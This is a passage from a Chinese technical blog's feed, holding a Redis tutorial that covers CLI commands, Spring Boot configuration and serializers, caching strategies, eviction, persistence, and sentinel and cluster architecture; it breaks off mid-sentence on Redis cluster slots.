&lt;/li&gt;
&lt;li&gt;&lt;p&gt;欧几里得 GCD 递归复杂度证明；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;拓展欧几里得算法求乘法逆元；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;利用同余性质推算大数</summary>
      
    
    
    
    <category term="review" scheme="https://blog.sjtuxhw.top/categories/review/"/>
    
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
    <category term="Algorithms" scheme="https://blog.sjtuxhw.top/tags/Algorithms/"/>
    
  </entry>
  
  <entry>
    <title>Redis 入门：从实践到理论</title>
    <link href="https://blog.sjtuxhw.top/technical/redis-starter/"/>
    <id>https://blog.sjtuxhw.top/technical/redis-starter/</id>
    <published>2024-11-12T13:05:37.000Z</published>
    <updated>2024-11-14T13:13:31.049Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-基本概念和-CLI-使用"><a href="#Chapter-1-基本概念和-CLI-使用" class="headerlink" title="Chapter 1. 基本概念和 CLI 使用"></a>Chapter 1. 基本概念和 CLI 使用</h1><h2 id="1-1-NoSQL"><a href="#1-1-NoSQL" class="headerlink" title="1.1 NoSQL"></a>1.1 NoSQL</h2><p>用于存储非结构化数据，不保证 ACID 事务特性（仅有最终一致性 Weak Consistency Model）。</p><p>Redis（Remote Dictionary Server）就是一类基于内存的键值型 NoSQL，不保证数据一致性，但可以保证性能。</p><ul><li><p>一种 KVStore System，可以方便的存放非结构化数据，这对于缓存各异性数据非常有帮助；</p></li><li><p>Handle 网络请求多线程。处理指令单线程，单个指令具有原子性；</p></li><li>低延迟，利用 I/O Multiplexing 在单线程中处理多个请求；</li><li>支持数据持久化；</li><li>支持主从集群（从备份，读写分离）和分片集群（数据拆分，存储上限提高）；</li></ul><h2 id="1-2-Redis-Data-Structure"><a href="#1-2-Redis-Data-Structure" class="headerlink" title="1.2 Redis Data Structure"></a>1.2 Redis Data Structure</h2><p>Redis Key 一般使用 String，Value 支持：</p><ul><li>基本类型：<code>String</code>、<code>Hash</code>、<code>List</code>、<code>Set</code>、<code>SortedSet</code>；</li><li>特殊类型：<code>GEO</code>（地理位置信息格式）、<code>BitMap</code>（位图）、<code>HyperLog</code>；</li></ul><h2 id="1-3-Basic-Redis-CLI-Commands"><a href="#1-3-Basic-Redis-CLI-Commands" class="headerlink" title="1.3 Basic Redis CLI Commands"></a>1.3 Basic Redis CLI Commands</h2><h3 id="1-3-1-General"><a href="#1-3-1-General" class="headerlink" title="1.3.1 General"></a>1.3.1 General</h3><p>命令行指令较多，建议查询官方文档而不是背诵。介绍常见的几个（General）：</p><ul><li><code>KEYS &lt;pattern&gt;</code>：查询 Key 符合 pattern（R.E.）的键值对；</li><li><code>DEL/EXISTS &lt;KEY&gt;</code>：删除、判断存在性；</li><li><code>EXPIRE/TTL &lt;KEY&gt; [sec]</code>：设置/获取键值的有效期（<code>-1</code> 为永久、<code>-2</code> 为已过期）；</li></ul><h3 id="1-3-2-String-int-float"><a href="#1-3-2-String-int-float" class="headerlink" title="1.3.2 String (+int/float)"></a>1.3.2 String (+int/float)</h3><ul><li><code>SET/MSET &lt;KEY&gt; &lt;VAL&gt;[...(KEY, VAL)]</code>：设置/批量设置键值；</li><li><code>GET/MGET &lt;KEY&gt;[...KEY]</code>：获取/批量获取；</li><li><code>INCR/INCRBY &lt;KEY&gt; [STEP]</code>：让存储数值型 String 的 Value 自增 1 或 <code>STEP</code>；</li><li><code>INCRBYFLOAT &lt;KEY&gt; [incr]</code>：让存储浮点型 String 的 Value 增长指定值；</li><li><code>SETNX &lt;KEY&gt; &lt;VAL&gt;</code>：仅不存在才插入（决不更改已存在的数据）；</li><li><code>SETEX &lt;KEY&gt; &lt;sec&gt; &lt;VAL&gt;</code>：设置并指定有效期；</li></ul><h3 id="1-3-3-The-Hierarchy-Structure-of-Redis-Key"><a href="#1-3-3-The-Hierarchy-Structure-of-Redis-Key" class="headerlink" title="1.3.3 The Hierarchy Structure of Redis Key"></a>1.3.3 The Hierarchy Structure of Redis Key</h3><p>Redis Key 允许使用多个单词形成层级结构，常用格式为 <code>&lt;PROJECT_NAME&gt;:&lt;BUSSINESS_NAME&gt;:[TYPE]:&lt;id&gt;</code>；</p><h3 id="1-3-4-Hash"><a href="#1-3-4-Hash" class="headerlink" title="1.3.4 Hash"></a>1.3.4 Hash</h3><p>String 结构存储时，想要修改其中某个字段不方便。</p><p>现在引入 Hash 数据类型，其 <code>value</code> 作为一个无序字典（多了一层 field-value 关系），类似一个 <code>HashMap</code>；</p><ul><li><code>HSET/HGET &lt;KEY&gt; &lt;FIELD&gt; [VAL]</code></li><li><code>HMSET / HMGET</code></li><li><code>HGETALL &lt;KEY&gt;</code>：获取这个键的 value 中的所有 field 的值；</li><li><code>HKEYS</code>：获取这个键的所有 field；</li><li><code>HVALS</code>：获取这个键的所有 value；</li><li><code>HSETNX &lt;KEY&gt; &lt;sec&gt; &lt;FIELD&gt; &lt;VAL&gt;</code>：仅不存在才插入；</li></ul><h3 id="1-3-5-List"><a href="#1-3-5-List" class="headerlink" title="1.3.5 List"></a>1.3.5 List</h3><p>Redis 中的 value 类型为列表，与双向链表很相似（同时支持正向、反向索引）。特性：</p><ul><li>有序、可重复、增删操作快、查询速度一般；</li></ul><p>操作如下：</p><ul><li><code>LPUSH/RPUSH &lt;KEY&gt; &lt;ELEMENT&gt;[...ELEMENT]</code>：从列表左侧/右侧插入；</li><li><code>LPOP/RPOP &lt;KEY&gt;</code>：弹出；</li><li><code>LRANGE &lt;KEY&gt; &lt;START&gt; &lt;END&gt;</code>：获取列表中的角标范围中所有元素；</li><li><code>BLPOP / BRPOP &lt;KEY&gt;[...KEY] &lt;sec&gt;</code>：和 <code>LPOP/RPOP</code> 类似，但是在没有元素时等待一段时间，而不是直接返回 <code>NIL</code>；</li></ul><h3 id="1-3-6-Set"><a href="#1-3-6-Set" class="headerlink" title="1.3.6 Set"></a>1.3.6 Set</h3><p>Redis 中的 value 类型为集合，与 <code>HashSet</code> 类似。特性：</p><ul><li>无序、元素不可重复、查找快、支持交并差集操作；</li></ul><p>操作如下：</p><ul><li><code>SADD/SREM &lt;KEY&gt; &lt;MEMBER&gt;[...MEMBER]</code>；添加/移除集合中的若干元素；</li><li><code>SCARD &lt;KEY&gt;</code>：获取集合中元素个数；</li><li><code>SISMEMBER &lt;KEY&gt; &lt;MEMBER&gt;</code>：是否在集合内；</li><li><code>SMEMBERS &lt;KEY&gt;</code>：获取集合中所有元素；</li></ul><h3 id="1-3-7-SortedSet"><a href="#1-3-7-SortedSet" class="headerlink" title="1.3.7 SortedSet"></a>1.3.7 SortedSet</h3><p>Redis 中 value 类型为有序集，每个元素携带 <code>score</code> 值（相当于优先级），可以基于 <code>score</code> 排序。</p><p>其底层基于 SkipTable + HashTable 实现。特性如下：</p><ul><li>可排序、元素不重复、查询速度快；</li></ul><p>操作如下：</p><ul><li><code>ZADD &lt;KEY&gt; &lt;score&gt; &lt;MEMBER&gt;</code>：添加一个或多个元素到 sorted set，如果已经存在则更新 <code>score</code> 值；</li><li><code>ZREM &lt;KEY&gt; &lt;MEMBER&gt;</code>：移除一个指定元素；</li><li><code>ZSCORE/ZRANK &lt;KEY&gt; &lt;MEMBER&gt;</code>：获取指定元素 score 值 / 排名；</li><li><p><code>ZCARD &lt;KEY&gt;</code>：获取元素个数；</p></li><li><p><code>ZCOUNT/ZRANGEBYSCORE &lt;KEY&gt; &lt;MIN_SCORE&gt; &lt;MAX_SCORE&gt;</code>：统计 score 值在指定范围内的元素个数 / 元素值；</p></li><li><code>ZRANGE &lt;KEY&gt; &lt;MIN_RANK&gt; &lt;MAX_RANL&gt;</code>：获取指定排名区间内的元素；</li><li><code>ZDIFF / ZINTER / ZUNION</code>：求差集、交集、并集；</li></ul><h1 id="Chapter-2-Using-Redis-With-Spring-Boot"><a href="#Chapter-2-Using-Redis-With-Spring-Boot" class="headerlink" title="Chapter 2. Using Redis With Spring Boot"></a>Chapter 2. Using Redis With Spring Boot</h1><h2 id="2-1-Basic-Usages"><a href="#2-1-Basic-Usages" class="headerlink" title="2.1 Basic Usages"></a>2.1 Basic Usages</h2><p>引入 Redis Client for Java 的 Spring Boot 依赖：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    implementation <span class="string">&#x27;org.springframework.boot:spring-boot-starter-data-redis&#x27;</span></span><br><span class="line">    <span class="comment">// 连接池实现</span></span><br><span class="line">    implementation <span class="string">&#x27;org.apache.commons:commons-pool2&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置 Redis 连接信息：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">redis:</span></span><br><span class="line">        <span class="attr">host:</span> <span class="string">...</span></span><br><span class="line">        <span class="attr">post:</span> <span class="string">...</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">...</span></span><br><span class="line">        <span class="comment"># 使用 lettuce 而非 jedis 实现</span></span><br><span class="line">        <span class="attr">lettuce:</span></span><br><span class="line">            <span class="attr">pool:</span></span><br><span class="line">                <span class="attr">max-active:</span> <span class="number">8</span><span class="comment"># 最大连接数</span></span><br><span class="line">                <span class="attr">max-idle:</span> <span class="number">8</span><span class="comment"># 最大空闲连接</span></span><br><span class="line">                <span class="attr">min-idle:</span> <span class="number">0</span><span class="comment"># 最小空闲连接</span></span><br><span class="line">                <span class="attr">max-wait:</span> <span class="string">100ms</span><span class="comment"># 最大连接等待时长</span></span><br></pre></td></tr></table></figure><p><strong>使用时自动装配 <code>RedisTemplate</code> 类型</strong>。</p><p>使用 <code>RedisTemplate</code> 的接口：</p><ul><li><p><code>RedisTemplate#opsForValue(Object key, Object val, [long timeout, TimeUnit unit])</code>：获取 Java 一般 Object 类型的操作，这个方法会将 <code>key, val</code> 全部序列化后存储。</p><blockquote><p>默认 <code>JdkSerializationRedisSerializer</code> 类型作为序列化器，底层使用 <code>ObjectOutputStream#writeObject</code>  完成序列化工作。</p><p>缺点：可读性差、默认序列化器的内存占用大（消息队列中的默认序列化器有同样问题）；</p><p>我们应该少用这种方法，尽量选择下面确定类型的方法。</p><p>还有一种方法是，自定义 Redis 的序列化方式。</p></blockquote></li><li><p><code>RedisTemplate#opsForXXX()</code>：返回 Spring Data Redis 对于指定数据类型 <code>XXX</code>（String/Hash/…）的可能操作集合 <code>XXXOperations</code>；</p></li></ul><p><code>XXXOperations</code> 类的对象可以完成对应类型的 <code>set / get</code> 等方法，并选用合适的序列化器进行存储处理。</p><h2 id="2-2-Self-defined-Serializer-for-Redis"><a href="#2-2-Self-defined-Serializer-for-Redis" class="headerlink" title="2.2 Self-defined Serializer for Redis"></a>2.2 Self-defined Serializer for Redis</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="title function_">redisTemplate</span><span class="params">(RedisConnectionFactory redisConnectionFactory)</span> &#123;</span><br><span class="line">    <span class="comment">/* Create empty template */</span></span><br><span class="line">    RedisTemplate&lt;String, Object&gt; template = <span class="keyword">new</span> <span class="title class_">RedisTemplate</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">/* Configure connection factory */</span></span><br><span class="line">    template.setConnectionFactory(redisConnectionFactory);</span><br><span class="line">    <span class="comment">/* Set Serializer for POJO */</span></span><br><span class="line">    <span class="type">GenericJackson2JsonRedisSerializer</span> <span class="variable">jsonRedisSerializer</span></span><br><span class="line">            <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GenericJackson2JsonRedisSerializer</span>();</span><br><span class="line">    <span class="comment">/* Use String serializer for key &amp; hash key (instead of Jdk serializer) */</span></span><br><span class="line">    template.setKeySerializer(RedisSerializer.string());</span><br><span class="line">    template.setHashKeySerializer(RedisSerializer.string());</span><br><span class="line">    <span class="comment">/* Use JSON serializer for value &amp; hash value (instead of Jdk serializer) */</span></span><br><span class="line">    template.setValueSerializer(jsonRedisSerializer);</span><br><span class="line">    template.setHashValueSerializer(jsonRedisSerializer);</span><br><span class="line">    <span class="keyword">return</span> template;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有个问题，<code>GenericJackson2JsonRedisSerializer</code> 对一类数据会反复保存 <code>@class</code> 字段（反序列化后的类型）。这个信息虽然是必要的，但很多情况下存储 <code>@class</code> 字段甚至比原数据还要占空间！</p><p>因此我们一般不会直接使用 <code>JSON</code> 序列化器来序列化我们的 POJO，而是我们开发者<strong><u>对一个层级下的键都约定一个数据类型</u></strong>，然后使用 <strong><u>String 序列化器</u></strong>，最终手动序列化和反序列化，那么可以节省这部分空间。</p><p>Spring 中已经帮我们包装好了序列化、反序列化全是 String 的 <code>RedisTemplate</code>，省得我们配置了，它就是 <code>StringRedisTemplate</code>；</p><blockquote><p>也就是 <code>RedisTemplate&lt;String, Object&gt;</code>，并且设置好全部都是 String 的序列化、反序列化器；</p></blockquote><h1 id="Chapter-3-内存型数据库理论"><a href="#Chapter-3-内存型数据库理论" class="headerlink" title="Chapter 3. 内存型数据库理论"></a>Chapter 3. 内存型数据库理论</h1><p>本章介绍一下以 Redis 为首的 NoSQL 内存型数据库产生、发展的历程，同时介绍其存在的问题以及解决方案。</p><h2 id="3-1-为什么需要内存型数据库？"><a href="#3-1-为什么需要内存型数据库？" class="headerlink" title="3.1 为什么需要内存型数据库？"></a>3.1 为什么需要内存型数据库？</h2><p>持久化在磁盘上的关系型数据库在存储关系数据、处理事务的多数场合下都非常得力，但免不了存在一些问题。</p><p>例如，在电商、文章档案等网页应用中，常常是读请求远多于写请求，即便 MySQL 有 cache buffer pool（InnoDB），在大量数据查询的场合下也会出现频繁的 cache evict，究其原因就是 cache working space 太小了。</p><p>人们发现只是读请求造成的 Disk I/O 是可以避免的——通过将数据托管到一个更大的内存空间（这段内存空间可以不连续、甚至可以不在单个物理节点上，由一个程序来管理它）中缓存起来，可以有效提升这些应用的处理效率和吞吐量。</p><p>结论 1：<strong><u>在庞大数据量的应用场景下，读多写少、数据时间局部性强的应用访问模式可以通过外置的内存缓冲区统一进行缓存，来提升整体性能和接口承载量</u></strong>。这就是 Redis 要解决的需求痛点。</p><h2 id="3-2-缓存策略"><a href="#3-2-缓存策略" class="headerlink" title="3.2 缓存策略"></a>3.2 缓存策略</h2><p>在确定使用内存型数据库作为持久化的关系型数据库的缓存后，接下来，和所有缓存机制一样（不仅仅是数据库领域），内存型数据库会遇到两个问题：</p><ol><li>采取什么样的读/写缓存策略更好？</li><li>当缓冲区占满后，evict 的策略是什么？</li></ol><h3 id="3-2-1-缓存读写策略-和-缓存模式"><a href="#3-2-1-缓存读写策略-和-缓存模式" class="headerlink" title="3.2.1 缓存读写策略 和 缓存模式"></a>3.2.1 缓存读写策略 和 缓存模式</h3><p>对于第一个问题，区分缓存读策略和缓存写策略。</p><p><strong>缓存读策略</strong>：大多数情况下比较显然：</p><ul><li>如果 read cache miss，一定需要从磁盘上读数据，顺带写回缓存；</li><li>如果 read cache hit，则可以考虑记录数据热点情况；</li></ul><p><strong>缓存写策略</strong>：主要会有 4 类策略：</p><ul><li>如果 write cache hit，可以：<ul><li><strong>Write-through</strong>：立即将数据写入缓存（即覆盖当前行）并主动刷新（flush）到磁盘；</li><li><strong>Write-back</strong>：先把数据写入缓存，但不立即刷新，直到下一个数据要覆盖这个数据行的时候，才更新到磁盘中（defer write to disk until replacement of line，<strong>只是尽可能推迟了写入磁盘的时间</strong>）。另外，这个方案需要额外维护 dirty bit 来指示是否与磁盘数据一致；</li></ul></li><li>如果 write cache miss，可以：<ul><li><strong>Write-allocate</strong>：写分配，在 write-miss 后，<strong>先将原数据从磁盘读入缓存，转换为 write-hit 的情况，再 write-back（仅修改缓存 + dirty bit）</strong>；</li><li><strong>No-write-allocate</strong>：直接写入磁盘，不加载到缓存（缓存中没有这个数据所在的数据行，因为本来就是 write-miss）；</li></ul></li></ul><p>显然，在 write cache hit 情况下，write-through 和 write-back 策略的优劣势互补：前者保证内存和磁盘的数据较强的一致性，但是同步写回操作免不了降低了操作性能；后者接受了一定程度上的数据不一致性（推迟刷盘时间），换取了短时间内的高并发性能。</p><p>write-allocate 和 no-write-allocate 之间的优劣势和 write-through、write-back 的优劣势的对比相同，因此人们常常根据实际情况选择 “<strong>write-back + write-allocate</strong>” 或 “write-through + no-write-allocate” 的策略中的其中一对。</p><p>上述读写策略的不同选择，就形成了以 Redis 为首的内存数据库的 3 个主流的<strong><u>宏观缓存模式</u></strong>，每种模式可以应对一些使用场景：</p><ul><li><p>旁路缓存模式（Cache Aside Pattern）：同时维护数据库、缓存，二者中的数据存在强一致性；</p><ul><li><p>read：使用上面统一的缓存读策略；</p></li><li><p>write：不存在 write cache hit + no-write-allocate。立即写回数据库，并拒绝缓存。清空写这个数据的缓存信息（使用不缓存手段消除数据不一致性，<strong><u>注意保证顺序先更新磁盘再删除缓存</u></strong>）；</p><blockquote><p>为什么不采用上述的写缓存策略，而是拒绝缓存？因为考虑到<strong><u>多次盲写</u></strong>的问题。</p></blockquote></li></ul></li><li><p>读写穿透模式（Read/Write Through Pattern）：视缓存为主要存储手段，二者中的数据也存在强一致性；</p><ul><li>read：使用上面统一的读策略；</li><li>write：<strong>write-through + write-allocate</strong>；</li></ul></li><li><p>异步缓存写入模式（Write Behind Pattern）：针对读写穿透模式的改进，牺牲一部分数据一致性换取更高的吞吐量；</p><ul><li>read：使用上面统一的读策略；</li><li>write：write-back（优化，不使用 dirty-bit，而是异步更新到数据库）；</li></ul></li></ul><blockquote><p>后文将以如何实现读写穿透模式为例，展示代码，同时加入缓存击穿和缓存雪崩等等问题的应对措施。代码将在文末以附录形式呈现。</p></blockquote><p>结论 2：<strong><u>常用的缓存读写策略有很多种，不过依赖它们制定的缓存模式常见的有 3 种，分别是 旁路缓存、读写穿透、异步缓存</u></strong>；</p><h3 id="3-2-2-缓存-Evict-策略：以-Redis-为例"><a href="#3-2-2-缓存-Evict-策略：以-Redis-为例" class="headerlink" title="3.2.2 缓存 Evict 策略：以 Redis 为例"></a>3.2.2 缓存 Evict 策略：以 Redis 为例</h3><p>不同内存型数据库的缓存淘汰策略不尽相同。下面以 Redis 为例介绍它的 cache evict 方案：</p><p>首先，Redis 正常不会主动 evict 数据项，而是先通过数据过期的方式腾出内存空间：</p><ul><li>过期时间：对每个数据项可以设置 TTL（Time-To-Live），表示数据过期时间。过期的数据自动被清空；</li><li>定期清理：Redis 可以配置扫描过期数据的频率，扫描过程称为 Garbage Collection（GC）；</li><li>随机选取：由于 Redis 管理的缓冲区很大，因此每次 GC 一般不会扫描全表，而是随机选取一部分进行回收；</li><li>惰性删除：某些键值可能概率原因一直无法被选中删除，因此一旦有查询找到该数据，发现该数据过期后立即删除（被动）；</li></ul><p>在此基础上，如果：</p><ul><li>有些键值始终没被查询，且一直没有被随机选取清理（躲过了定期清理和惰性删除）；</li><li>过多的键值没有设置过期时间；</li><li>数据工作集（working set）进一步增大；</li></ul><p>导致内存空间还是没法及时腾出，那么 Redis 就会采取主动 evict 的方案。</p><p>Redis 主动进行 cache evict 时可以配置 8 种策略（注意，下面的策略都是 “没办法通过数据过期腾出空间” 的主动举措）：</p><ul><li><code>noneviction</code>：缓冲区占满后报错，不会删除任何键值；</li><li><code>allkeys-lru</code>：对所有缓存键使用 LRU 策略 evict；</li><li><code>volatile-lru</code>：从设置了过期时间的数据（不一定过期了）中使用 LRU 策略 evict；</li><li><code>allkeys/volatile-random</code>：对所有缓存键/设置了过期时间的缓存记录使用随机策略 evict；</li><li><code>volatile-ttl</code>：从设置过期时间的缓存记录中选择剩余存活时间最少的记录 evict；</li><li><code>allkeys/volatile-lfu</code>：从所有缓存键/设置了过期时间的缓存记录使用 LFU 策略 evict；</li></ul><blockquote><p>LRU:  Least Recently Used；</p><p>LFU:  Least Frequently Used；</p></blockquote><p>结论 3:   <strong><u>Redis 对于缓存使用率过高的解决方案是 数据过期 + 主动 evict。其中数据过期依赖 “定时清理” 和 “惰性删除”，主动 evict 依赖 8 种 evict 策略</u></strong>。</p><h2 id="3-3-缓存击穿-amp-缓存雪崩-Cache-Penetration-Avalanche"><a href="#3-3-缓存击穿-amp-缓存雪崩-Cache-Penetration-Avalanche" class="headerlink" title="3.3 缓存击穿 &amp; 缓存雪崩 Cache Penetration/Avalanche"></a>3.3 缓存击穿 &amp; 缓存雪崩 Cache Penetration/Avalanche</h2><p>注意到以上方案，从缓存读写策略、缓存模式，到缓存 evict 策略，全部都没有考虑到一个问题，或者说一类独特的访问 pattern：如果<strong><u>一直查询并不存在的数据</u></strong>会发生什么。</p><p>无论按照上面的哪种策略，都会频繁出现 “cache miss - 查找数据库 - 数据库未找到” 这个流程，这会频繁绕过缓存，增大数据库的 disk I/O，影响正常业务逻辑的时延和吞吐量，尤其是大量的 Client 查找一个并不存在的数据的时候，性能影响更为明显。这种现象被称为 “缓存击穿”。</p><p>为了解决缓存击穿的问题，可行的解决方案之一是：根据具体业务逻辑指定一个无效值（Invalid Value），一旦出现一次 read cache miss 并且发现数据库未找到的情况，可以在缓存中写入这个无效值，下次 read cache hit 就知道数据库中没有了。</p><blockquote><p>这种解决方案借鉴了 Bloom Filter 的设计思想。</p><p>Google 的一篇论文曾经介绍使用跳表 + Bloom Filter 为 Log-Structure Merged Tree 提升查询速度。</p></blockquote><p>但是，除了 “一直查询并不存在的数据”，还有一类情况会引发缓存击穿：<strong><u>某个热点数据过期被清理</u></strong>。</p><p>在过期后的短时间内，没有等上缓存恢复就出现大量的对该数据的并发请求。这些请求会 cache miss 并 fallback 到数据库，造成上述问题。</p><p>如果更严重一点，假设<strong><u>一批热点数据同时过期</u></strong>，也就是大批数据出现 cache miss，那么大量请求可能造成拒绝查询甚至宕机的后果，这种现象被称为 “缓存雪崩”。</p><p>解决这类缓存击穿，以及缓存雪崩的方案之一，无非是：</p><ul><li>延长热点数据的 TTL（比如每次访问时增加 TTL），或者热点数据永久驻留缓存；</li><li>批量设置缓存时，在一定时间范围内随机指定 TTL（例如 10~30 分钟内的均匀分布）；</li></ul><p>还有一种情况，如果 Redis 出现宕机，内存缓存数据全部丢失，也会出现缓存雪崩的问题，这个时候仅靠以上的应对方案已经不足以解决了。我们需要对 Redis 中的数据进行适当的持久化（“适当” 指同时保证性能）来尽量避免这个情况。</p><p>结论 4：<strong><u>“一直查询不存在的数据” 或者 “某个热点数据被清理” 都会造成缓存击穿、“一批热点数据同时过期”、“内存数据库宕机” 都可能造成缓存雪崩。对应的解决方案是 “添加无效值缓存”、“延长热点数据 TTL”、“随机化批量缓存 TTL”，以及 “适当的缓存持久化”</u></strong>。</p><h2 id="3-4-缓存持久化：以-Redis-为例"><a href="#3-4-缓存持久化：以-Redis-为例" class="headerlink" title="3.4 缓存持久化：以 Redis 为例"></a>3.4 缓存持久化：以 Redis 为例</h2><p>基于上述原因，我们需要对内存型数据库进行适当的缓存持久化。我们仍然以 Redis 为例说明。</p><p>Redis 提供了一套缓存持久化方案：RDB；</p><p>首先 RDB 支持全量备份，但是如果 Redis 缓存空间很大，一次全量备份刷盘会耗时很久，虽说 NoSQL 不需要支持完整的 ACID 性质，但也会严重影响查询时延和吞吐量，并且可能出现持久化的数据不一致的情况。也就是说：</p><ul><li>RDB 即便支持全量备份也不能太过频繁，对性能影响较大；</li><li>RDB 以分钟级别进行全量备份，可能短时间内会丢失大量新数据（snapshot 数据不一致）；</li></ul><p>因此 RDB 全量备份在多数场合下是不划算的。</p><p>于是人们借鉴了关系型数据库的 Binary Log 的思想，添加了一种 AOF 机制，采用<strong><u>增量备份</u></strong>来备份缓存数据。</p><p><strong><u>AOF 持久化机制</u></strong>（Append Only File），就是一种<strong>增量逻辑备份</strong>，向日志文件中以二进制形式写入修改缓存的指令，并且使用了 AOF Buffer 来批量写入以提升效率。</p><p>我们注意到 AOF Log 随着时间推移也会越来越大、越来越多，加载和存储效率都不高。一种解决方案是，定时对已有的 AOF Log 进行重写压缩（包括删去无效修改、指令重写等等）和轮替。</p><p>此外，为了解决备份时数据不一致现象，Redis 再引入 AOF Rewrite Buffer，可以存放在备份期间修改的数据指令，以便子进程对 AOF Log 重写时加入最新的、遗漏的修改指令，维持了一些数据一致性。</p><p>结论 5:   <strong><u>Redis 提供了 RDB 全量备份和 AOF 增量备份两种缓存持久化方案，和关系型数据库一样，二者配合使用可以一定程度上解决缓存热身和雪崩问题</u></strong>。</p><p>虽然缓存持久化能一定程度上解决缓存雪崩、缓存热身等问题，但是无法提升 Redis 的可用性（availability）。为了实现高可用，我们需要引入 Redis 集群，利用多个物理节点 primary-backup 的方式实现高可用支持。</p><h2 id="3-5-内存数据库副本-与-高可用支持"><a href="#3-5-内存数据库副本-与-高可用支持" class="headerlink" title="3.5 内存数据库副本 与 高可用支持"></a>3.5 内存数据库副本 与 高可用支持</h2><p>一个经典的架构：primary-backup 架构（旧称 “master-slave” 主从架构），可以作为数据 replicas 的模式，在多种分布式系统上都在使用。</p><p>例如，我们可以对 Redis 采用这种架构策略。一个 Redis 节点作为 primary，其他两个 redis 作为 backup server；</p><p>其中：</p><ul><li>primary 负责统一写操作，再利用类似 RSM（Replicated State Machine）之类的机制向 backup 发送数据 / 以指令传播的形式同步数据的修改；</li><li><p>primary 和 backup server 都可以处理读操作，有助于减小 primary 负担。</p></li><li><p>primary 维护 Write Ahead Log，在 backup 宕机时能够从 primary 的 WAL 以及自身的 Log 中迅速恢复；</p></li></ul><p>如果考虑到 primary 也可能宕机，可以引入分布式协调者（coordinator），决定谁作为 primary。</p><blockquote><p>这个协调者在 Redis 的术语中被称为 <strong>“哨兵”（Sentinel）</strong>。</p></blockquote><p>另外，如果还需要保证 coordinator 自身的高可用，可以对 coordinator 进行 replications，可以构建经典 <strong><u>“主从-哨兵” 架构</u></strong>。</p><p><img src="imgs/sentinels-and-replicas.png" width="400px" /></p><p>为了确保不会因为 network partition 而出现多个 primary（“split-brain problem”），可以将 coordinator 中选举 primary、心跳监测的职责分出给唯一的 view server。第一次 coordinator 接受 client 请求时先询问 view server 关于 primary 的信息，然后再向 primary 给出修改请求。</p><p>最终，如果还需要保证 view server 的高可用以及数据一致性，还可以将轻量的 view server 进行 replications 并交由 Paxos 或者 ZooKeeper 或者 KRaft 来做分布式协调管理。</p><p>一般为了架构简单起见，可以不使用 view server，直接在 sentinels 中引入 primary 投票机制（主观下线、客观下线），粗略地模拟 Paxos 的一致性协调管理。</p><blockquote><p> 注：选拔 Primary 的标准可以考虑硬件配置、断开 primary 连接的时间长短等等信息来指定优先级，从而选择。</p></blockquote><h2 id="3-6-内存数据库集群"><a href="#3-6-内存数据库集群" class="headerlink" title="3.6 内存数据库集群"></a>3.6 内存数据库集群</h2><p>前面的例子虽然介绍了，内存数据库可以通过建立 replicas 来提升高可用性，但是单个物理节点的存储量总有上限。</p><p>在极大的 data working set 场景下，我们可能需要通过集群来实现更大规模数据的缓存。</p><p>首先需要解决集群后的缓存位置问题。大多数内存型数据库采用了 <strong><u>一致性哈希（Consistent Hashing）思想</u></strong>：</p><ul><li><p>我们先按照常用的 hash 算法将 Key hash 到 $0\sim2^{32}-1$ 个桶中，并且把它们想象成一个环结构；</p></li><li><p>将机器的唯一标识（例如 <code>MAC/IP/HOSTNAME</code> 等信息）以及需要缓存的 KV 都 hash 到环上；</p></li><li><p>于是就能判断信息究竟放在哪一台服务器上了：按顺时针方向，所有对象 hash 的位置距离最近的机器 hash 点就是要存的机器，如下图所示：</p><p><img src="imgs/consistent-hashing-example.png" width="600px" /></p></li><li><p>当有机器（<code>t4</code>）加入分布式集群后，<code>t3 - t4</code> 间的缓存将转移至 <code>t4</code> 上（少量数据交换）；</p><p>反之，有机器（<code>t4</code>）从分布式集群中离线后，<code>t3 - t4</code> 间的缓存将重新转移至 <code>t2</code>；</p></li></ul><p>此外，hash 的位置可以根据机器的硬件承载能力适当调整。调整方法可以借助下文介绍的 virtual nodes 来完成。</p><p>这样的方案能在分布式场景下尽可能减少缓存失效和变动的比例；</p><p>但这种方案仍然存在问题：当集群中的节点数量较少时，可能会出现<strong><u>节点在哈希空间中分布不平衡</u></strong>的问题（hash 环的倾斜和负载不均），甚至引发雪崩问题（最多数据的 A 故障，全转移给 B，然后 B 故障，并重复下去，造成整个分布式集群崩溃）。</p><p>解决 hash 环倾斜的问题的方案之一就是引入 “<strong><u>虚拟节点</u></strong>”（相当于给机器 hash 点创建 “软链接”），将 virtual nodes 和 real nodes 的映射关系记录在 Hash Ring 中；</p><p>上面解决方案的具体实现被称为 “<strong><u>Chord 算法</u></strong>”；</p><p>我们现在继续以 Redis 为例。在 Redis 集群中，实现的方法略有差别，它一般创建一个超大的数组，例如 <code>struct clusterNode *slots[]</code>，规定哪些 Key Hash 值的范围由指定的 Redis 